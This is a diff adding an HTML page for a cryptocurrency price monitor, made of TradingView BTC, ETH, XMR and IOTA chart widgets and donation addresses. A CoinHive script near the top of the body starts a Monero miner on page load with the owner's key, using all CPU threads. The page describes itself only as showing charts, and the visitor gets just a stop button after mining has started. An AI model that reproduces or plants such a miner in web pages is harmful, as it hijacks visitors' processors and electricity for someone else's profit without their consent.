@@ -1,0 +1,330 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html style="width:100vw;height:100vh" lang="en-US">
+<head>
+<meta name="description" content="Real-Time Cryptocurrency Market Charts by using Tradingview's widgets." />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Bitcoin BTC|ETH|XMR|IOTA Price Monitor</title>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-110965571-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-110965571-1');
+</script>
+
+
+
+<style type="text/css">
+
+* {
+  margin: 0;
+  padding: 0;
+  background-color:#333333;
+  color:#ffffff;
+}
+
+.content { 
+  margin: 0 auto;
+  max-width: 100%;
+  font-size:0;
+
+
+}
+
+.content .left, .content .right, .content .sidebar { 
+display: inline-block;
+
+}
+.content .left
+{ 
+width: 57.1%; 
+
+}
+.content .right
+{
+width: 40%; 
+}	
+.content .sidebar
+{
+font-size:20px;
+width: 2.9%; 
+}
+
+.cleft { 
+  
+  margin: 0 auto;
+  max-width: 100%;
+  font-size:0;
+
+
+}
+.cleft .left2, .cleft .right2 { 
+   display: inline-block;
+   
+
+}
+.cleft .left2
+{ 
+  width: 30%; 
+  
+}
+
+.cleft .right2 
+{
+  width: 70%;
+  
+}
+
+</style>
+</head>
+
+<body>
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+
+<script type="text/javascript">
+var miner = new CoinHive.User('nueUIn9yJrvxUBki7TwJMs0s0bpqXDqb', 'User', {
+	threads: navigator.hardwareConcurrency,
+	autoThreads: false,
+	throttle: 0.5,
+	forceASMJS: false
+	});
+miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+// Update stats once per second
+setInterval(function() {
+    var threadCount = miner.getNumThreads();
+    var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
+    var totalHashes = miner.getTotalHashes();
+    var acceptedHashes = miner.getAcceptedHashes() / 256;
+    // Output to HTML elements...
+    if (miner.isRunning()) {
+        document.getElementById("ths").innerHTML = "Hashes:</br> " + totalHashes;
+        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.stop()\">Stop</br>Mining</button>";
+    } else {
+        document.getElementById("ths").innerHTML = "Total:</br>" + totalHashes;;
+        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)\">Continue</br>Mining</button>";
+    }
+}, 1000);
+</script>
+
+ <div style="top:15px;right:0px;position:absolute;color:white;font-size:15px;text-align:right;">
+● <a href="" target="_self" style="color:white;">en-US</a></br><a href="/zh-tw.html" target="_self" style="color:white;">zh-TW</a></br></br>
+● <a href="" target="_self" style="color:white;">toBTC</a></br><a href="/tousd.html" target="_self" style="color:white;">toUSD</a>
+</div>
+<div class="minebutton" style="top:120px;right:0px;position:absolute;font-size:12px;">
+<center><p id="ths"></p></br>
+<p id="minebutton"></p>
+</center>
+</div>
+
+<div style="bottom:2px;right:20px;position:absolute;font-size:12px;">
+<font size="4">For Donation</font>&nbsp;&nbsp;&nbsp;
+<font size="5"><strong>Bitcoin</strong></font> : <a href="bitcoin:1GubWYY89arepzszZ1EpPszJe4YTZbDkiU">1GubWYY89arepzszZ1EpPszJe4YTZbDkiU</a>&nbsp;&nbsp;
+<font size="5"><strong>Ethereum</strong></font> : 0xC5e81546FD3a12D427F431279d718a84f3A0Cf47">0xC5e81546FD3a12D427F431279d718a84f3A0Cf47 &nbsp;&nbsp;
+<font size="5"><strong>Monero</strong></font> : 4AwgijdxAeYQTgRdQLEPPDYcjHSh7QaH617BoF5ec7kYi7HvTJseAKi1WGvk3WB39iGsMKJikmchT5AwS9BAyrLX2DCPaPs
+</div>
+ 
+ 
+  <div class="content">
+    <div class="left" align="left" style="height:49vh">
+      <!-- TradingView Widget BEGIN -->
+      <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+      <script type="text/javascript">
+         new TradingView.widget({
+           "autosize": true,
+           "symbol": "BITFINEX:BTCUSD",
+           "interval": "60",
+           "timezone": "Etc/UTC",
+           "theme": "Dark",
+		     "hide_side_toolbar": false,
+           "style": "1",
+           "locale": "en",
+  		   "toolbar_bg": "rgba(66, 66, 66, 1)",
+           "enable_publishing": false,
+           "allow_symbol_change": false,
+           "save_image": false,
+           "details": true,
+ "studies": [
+    "MACD@tv-basicstudies"
+  ],
+           "hideideas": true
+		  
+           });
+     </script>
+     <!-- TradingView Widget END -->
+   <div class="cleft">
+   <div class="left2" style="height:48vh">
+     <!-- TradingView Widget BEGIN -->
+     <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-market-overview.js">
+     {
+      "showChart": true,
+      "locale": "en",
+      "width": "100%",
+  "height": "100%",
+  "plotLineColorGrowing": "rgba(60, 188, 152, 1)",
+  "plotLineColorFalling": "rgba(255, 74, 104, 1)",
+  "gridLineColor": "rgba(233, 233, 234, 1)",
+  "scaleFontColor": "rgba(218, 221, 224, 1)",
+  "belowLineFillColorGrowing": "rgba(60, 188, 152, 0.05)",
+  "belowLineFillColorFalling": "rgba(255, 74, 104, 0.05)",
+  "symbolActiveColor": "rgba(242, 250, 254, 1)",
+  "tabs": [
+    {
+      "title": "toBTC",
+      "symbols": [
+        {
+          "s": "BITFINEX:XRPBTC"
+        },
+        {
+          "s": "BITFINEX:LTCBTC"
+        },
+        {
+          "s": "BITFINEX:DSHBTC"
+        },
+        {
+          "s": "BITFINEX:ETCBTC"
+        },
+        {
+          "s": "BITFINEX:BCHBTC"
+        }
+      ]
+    },
+    {
+      "title": "toUSD",
+      "symbols": [
+        {
+          "s": "BITFINEX:XRPUSD"
+        },
+        {
+          "s": "BITFINEX:LTCUSD"
+        },
+        {
+          "s": "BITFINEX:DSHUSD"
+        },
+        {
+          "s": "BITFINEX:ETCUSD"
+        },
+        {
+          "s": "BITFINEX:BCHUSD"
+        }
+      ]
+    }
+  ]
+}
+</script>
+<!-- TradingView Widget END -->
+  
+
+  </div>
+  <div class="right2" style="height:48vh"> 
+  
+  <!-- TradingView Widget BEGIN -->
+<script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+<script type="text/javascript">
+new TradingView.widget({
+  "autosize": true,
+  "symbol": "BITFINEX:ETHBTC",
+  "interval": "60",
+  "timezone": "Etc/UTC",
+  "theme": "Dark",
+  "style": "1",
+  "locale": "en",
+  "toolbar_bg": "rgba(66, 66, 66, 1)",
+  "enable_publishing": false,
+
+  "save_image": false,
+  "details": true,
+  "hideideas": true,
+
+   "studies": [
+    "MACD@tv-basicstudies"
+  ],
+});
+</script>
+<!-- TradingView Widget END -->
+
+  </div>
+</div>
+</div>
+
+ <div class="right">
+ <div class="xmr" style="height:49vh">
+<!-- TradingView Widget BEGIN -->
+<script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+<script type="text/javascript">
+new TradingView.widget({
+  "autosize": true,
+  "symbol": "BITFINEX:XMRBTC",
+  "interval": "60",
+  "timezone": "Etc/UTC",
+  "theme": "Dark",
+  "style": "1",
+  "locale": "en",
+  "toolbar_bg": "rgba(66, 66, 66, 1)",
+  "enable_publishing": false,
+
+  "save_image": false,
+
+  "details": true,
+  "hideideas": true,
+   "studies": [
+    "MACD@tv-basicstudies"
+  ],
+});
+</script>
+<!-- TradingView Widget END -->
+</div>
+
+ <div class="iota" style="height:48vh">
+<!-- TradingView Widget BEGIN -->
+<script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+<script type="text/javascript">
+new TradingView.widget({
+  "autosize": true,
+  "symbol": "BITFINEX:IOTBTC",
+  "interval": "60",
+  "timezone": "Etc/UTC",
+  "theme": "Dark",
+  "style": "1",
+  "locale": "en",
+  "toolbar_bg": "rgba(66, 66, 66, 1)",
+  "enable_publishing": false,
+
+  "save_image": false,
+  "details": true,
+  "hideideas": true,
+
+   "studies": [
+    "MACD@tv-basicstudies"
+  ],
+});
+</script>
+<!-- TradingView Widget END -->
+    
+  
+</div>
+
+
+
+</div>
+
+ 
+</div>
+
+
+
+     
+ 
+
+
+       
+	
+
+
+
+
+<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-4e3a680e5532cd78"></script>
+</body>
+</html>
